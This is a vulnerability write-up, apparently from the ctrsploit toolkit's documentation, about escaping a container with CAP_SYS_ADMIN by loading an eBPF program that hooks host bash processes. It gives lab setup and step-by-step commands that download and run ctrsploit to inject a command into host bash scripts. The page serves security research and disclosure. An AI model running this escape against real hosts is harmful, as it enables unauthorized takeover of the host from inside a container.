---
maintainer:
    - ssst0n3
---
# ebpf escape by hooking bash process

## 1. Vulnerability Introduction

This vulnerability describes a container escape method that leverages eBPF.

When a container is granted excessive privileges (such as CAP_SYS_ADMIN or CAP_BPF), an attacker can load a malicious eBPF program into the host's kernel from within the container.

This eBPF program can inject evil script by hooking bash process.

## 2. Exploit Scenario

Insecure configuration

## 3. Prerequisites

vulnerability exists:
* CAP_BND: CAP_SYS_ADMIN / CAP_BPF

vulnerability exploitable:
* CAP_EFF: CAP_SYS_ADMIN

## 4. Vulnerability Existence Check

`ctrsploit checksec ebpf`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2/
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker version
Client: Docker Engine - Community
 Version:           19.03.13
 API version:       1.40
 Go version:        go1.13.15
 Git commit:        4484c46d9d
 Built:             Wed Sep 16 17:02:52 2020
 OS/Arch:           linux/amd64
 Experimental:      false

Server: Docker Engine - Community
 Engine:
  Version:          19.03.13
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.13.15
  Git commit:       4484c46d9d
  Built:            Wed Sep 16 17:01:20 2020
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.3.7
  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175
 runc:
  Version:          1.0.0-rc10
  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
root@localhost:~# cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

</details>

### 5.2 Reproduce Steps

startup ebpf

```shell
$ ./ssh
root@localhost:~# docker run -ti --cap-add=CAP_SYS_ADMIN busybox:latest ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul caps sys_admin x ebpf bash -c 'echo escaped'
INFO[0000] Waiting for events..
```

run a bash script on host

```shell
$ .ssh
root@localhost:~# cat <<EOF>1.sh 
#!/bin/bash
echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
EOF
root@localhost:~# chmod +x 1.sh
root@localhost:~# ./1.sh 
escaped
```

## 6. Advance

### 6.1 --once: exit after first hit

/bin/bash will open fd 255 after each execve, so the command will be executed many times even in the same script.

use `--once` to exit after the first hit.

### 6.2 --cmd: specify command

### 6.3 --root: only hook root user's bash script
